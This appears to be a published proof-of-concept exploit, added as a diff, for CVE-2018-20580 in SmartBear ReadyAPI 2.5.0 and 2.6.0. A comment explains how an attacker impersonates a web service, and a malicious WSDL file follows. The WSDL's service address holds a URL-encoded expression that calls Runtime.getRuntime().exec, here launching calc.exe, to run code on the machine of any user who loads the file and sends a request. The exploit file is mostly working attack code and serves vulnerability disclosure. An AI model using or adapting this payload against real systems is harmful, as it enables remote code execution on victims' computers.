@@ -1,0 +1,96 @@
+<!--
+# Exploit Title: ReadyAPI Remote Code Execution Vulnerability.
+# Date: May, 2019
+# Exploit Author: Gilson Camelo => https://twitter.com/gscamelo
+# Vendor Homepage: https://smartbear.com/product/ready-api
+# Software Link: https://smartbear.com/product/ready-api/overview/
+# Github: https://github.com/gscamelo/CVE-2018-20580
+# Version: 2.5.0 and 2.6.0
+# Tested on: Windows
+# CVE : CVE-2018-20580
+
+I found a new vulnerability in the (ReadyAPI). It allows an attacker to
+execute a remote code on the local machine putting in danger the ReadyAPI
+users including developers, pentesters, etc...
+
+The ReadyAPI allows users to open a SOAP project and import WSDL files that
+help the users to communicate with the remote server easily.
+
+The WSDL file owner can determine default values of some parameters. An
+attacker can impersonate a legitimate web service and inject a malicious
+code into a default value of one of the parameters and spread it to
+ReadyAPI clients.
+
+When a ReadyAPI client load a malicious WSDL file to his project and send a
+request containing the malicious code the ReadyAPI will execute the
+malicious code on the victim's computer.
+
+The attack scenario:
+
+An attacker impersonates a regular web service with a WSDL containing the
+malicious code.
+The victim creates a new project in the ReadyAPI and loads the malicious
+WSDL File.
+The victim decides to send a request to the remote server and the ReadyAPI
+execute the malicious code.
+The attacker succeeds in executing malicious code in the victim's machine
+and take it over.
+-->
+
+<?xml version="1.0" encoding="UTF-8"?>
+<wsdl:definitions
+                xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"
+                xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/"
+                xmlns:mime="http://schemas.xmlsoap.org/wsdl/mime/"
+                xmlns:tns="http://example.com/stockquote.wsdl"
+                xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"
+                xmlns:s="http://www.w3.org/2001/XMLSchema"
+                xmlns:http="http://schemas.xmlsoap.org/wsdl/http/"
+                targetNamespace="http://example.com/stockquote.wsdl"
+                xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/">
+
+  <wsdl:types>
+    <s:schema elementFormDefault="qualified" targetNamespace="http://example.com/stockquote.wsdl">
+      <s:element name="Malicious_Request">
+        <s:complexType>
+          <s:sequence>
+            <s:element name="Payload" default="PWNED" type="s:string" />
+          </s:sequence>
+        </s:complexType>
+      </s:element>
+
+    </s:schema>
+  </wsdl:types>
+  <wsdl:message name="Malicious_RequestSoapIn">
+    <wsdl:part name="parameters" element="tns:Malicious_Request" />
+  </wsdl:message>
+
+  <wsdl:portType name="Exploit">
+    <wsdl:operation name="Malicious_Request">
+      <wsdl:documentation xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/">Create a new xpl</wsdl:documentation>
+      <wsdl:input message="tns:Malicious_RequestSoapIn" />
+      <wsdl:output message="tns:Malicious_RequestSoapOut" />
+    </wsdl:operation>
+  </wsdl:portType>
+
+  <wsdl:binding name="Exploit" type="tns:Exploit">
+    <soap:binding transport="http://schemas.xmlsoap.org/soap/http" />
+    <wsdl:operation name="Malicious_Request">
+      <soap:operation soapAction="https://www.test.com.br/Malicious_Request" style="document" />
+      <wsdl:input>
+        <soap:body use="literal" />
+      </wsdl:input>
+      <wsdl:output>
+        <soap:body use="literal" />
+      </wsdl:output>
+    </wsdl:operation>
+  </wsdl:binding>
+
+  <wsdl:service name="XPL">
+    <wsdl:documentation xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/">My first Exploit</wsdl:documentation>
+    <wsdl:port name="Exploit" binding="tns:Exploit">
+      <soap:address location="http%3A%2F%2F127.0.0.1%2F%24%7B%3DRuntime.getRuntime%28%29.exec%28%27calc.exe%27%29%7D%3B" />
+    </wsdl:port>
+
+  </wsdl:service>
+</wsdl:definitions>
